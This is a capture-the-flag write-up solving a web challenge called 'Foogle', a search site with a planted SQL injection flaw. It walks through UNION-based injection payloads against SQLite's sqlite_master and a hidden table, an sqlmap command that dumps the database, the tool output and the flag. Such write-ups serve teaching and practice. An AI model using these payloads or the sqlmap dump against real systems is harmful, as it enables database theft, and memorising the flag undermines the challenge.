# Foogle
![](https://img.shields.io/badge/category-web-blue)

## Description
With Google being the world’s largest search engine, you wonder if you could steal some of their market share. After all, creating search engines is easy enough and if you do manage to steal some Google users, you can put ‘Created major Google rival’ in your résumé. However, you have no idea how to even create search engines, so you outsource your work to a team of high school students, disguised as a ‘free internship at a fast-growing tech startup.’

Now, having spent no money or time, you have a fully functional search engine, called Foogle. Naturally, as a cost-saving measure, you fired all the interns as soon as they were done.

[http://138.197.69.9:30001](http://138.197.69.9:30001)

## Hints
Unfortunately for you, **jdabtieu**, the project lead, went to the Toronto Star after learning that he got stiffed. In the article, he said, ‘Oh, and I might have injected some nasty security vulnerabilities in the code, just in case I didn’t get paid.’ You wonder to yourself, what nasty surprise could he have injected? The search engine is just an input field connected to a database and…oh.

## Solution
Opening the webpage shows that it looks like a low quality clone of Google. As the hint suggests, we'll likely have to perform a SQLi attack. Additionally, looking at the changelog shows the same thing: Version 1.3.2 rolled back SQL injection protection. Additionally, searching the search engine for something generic, like the letter a, results in two results hinting at injecting SQLite.

The way a basic search query would work in a database looks something like this:
```sql
SELECT * FROM table_name /* selects all results from table_name matching the criteria below */
    WHERE description LIKE '%query_goes_here%' /* query should be in the description of the search result */
    ...;
```

We can confirm that it is injectable by doing the search query `a'`. This would cause a syntax error, causing an Internal Server Error if the site is vulnerable.

### Manually Exploiting the Database
While tools like SQLmap are powerful, they might not always work. It's good practice to do some manual exploitation.

We can observe that the table likely has at least 3 fields - one for URL, title, and description. Thus, to leak all the tables, we can use the following as a search query:
```sql
' UNION SELECT sql, NULL, NULL FROM sqlite_master--
```
This query appends the result of `SELECT sql, NULL, NULL FROM sqlite_master` to the search results, and comments out the rest of the query. `sqlite_master` is a special table in sqlite containing the schema and table names of all the tables in a database.

By executing this query, we notice two new search results - notably, the schema of the search table, and also another table called s3cr3t.

To leak this s3cr3t table, we can use this following query:
```sql
' UNION SELECT flag, NULL, NULL FROM s3cr3t--
```
Just like the previous question, it appends the entire s3cr3t table to the search results.

And as expected, we get a flag.

Flag: `CTF{sanitize_input_lmao_sqli}`.

### Exploiting with SQLmap
We already know that it's vulnerable to SQL injection, and that the backend database system is SQLite. This is enough information for SQLmap to try and leak the database. (Note: depending on your computer, you might have to replace `python3` with `python`)
```
jww20@Windows:/tmp/sqlmap$ python3 sqlmap.py --url 138.197.69.9:30001 --forms --dbms sqlite --dump
```
The url flag is used to specify the url of the vulnerable webpage, `--forms` tells it to automatically look for forms, `--dbms sqlite` tells it that the database is SQLite so that it won't have to waste time trying other SQL configurations, and `--dump` tells SQLmap to dump the database so we can read it.

Following the prompts, SQLmap is able to detect the search form, but it claims that there is a connection problem. We know that's not true because we have no problem accessing the site. Let's just ignore it and tell SQLmap to continue.

SQLmap does end up finding a vulnerability:
```
[13:16:08] [INFO] target URL appears to have 3 columns in query
[13:16:08] [INFO] GET parameter 'q' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[13:16:08] [INFO] checking if the injection point on GET parameter 'q' is a false positive
```
That's the same thing we found manually!

```
[13:17:20] [INFO] fetching columns for table 's3cr3t'
[13:17:20] [INFO] fetching entries for table 's3cr3t'
Database: <current>
Table: s3cr3t
[1 entry]
+-------------------------------+
| flag                          |
+-------------------------------+
| CTF{sanitize_input_lmao_sqli} |
+-------------------------------+

[13:17:20] [INFO] table 'SQLite_masterdb.s3cr3t' dumped to CSV file
[13:17:20] [INFO] fetching columns for table 'search'
[13:17:20] [INFO] fetching entries for table 'search'
Database: <current>
Table: search
[10 entries]
+----------------+--------------------------------+---------------------------+
| link           | title                          | description               |
+----------------+--------------------------------+---------------------------+
...(cut off this table because it's not relevant)
```

Flag: `CTF{sanitize_input_lmao_sqli}`
